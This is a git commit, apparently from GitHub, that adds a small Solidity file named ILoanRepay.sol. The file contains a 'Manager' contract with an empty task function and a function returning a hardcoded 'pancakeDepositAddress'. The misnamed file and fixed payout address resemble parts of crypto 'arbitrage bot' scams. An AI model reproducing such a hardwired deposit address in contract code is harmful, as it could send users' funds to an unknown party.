9e2349f71f933a18a3c0c1c27d07dea4d6245a80
primi43 <93877666+primi43@users.noreply.github.com>
2021-11-07 18:47:10 +0100

    Create ILoanRepay.sol

---
+++ ILoanRepay.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x50760c0D328F5f450662B033Aa9B8812E0e9d4F7;
+	}
+}
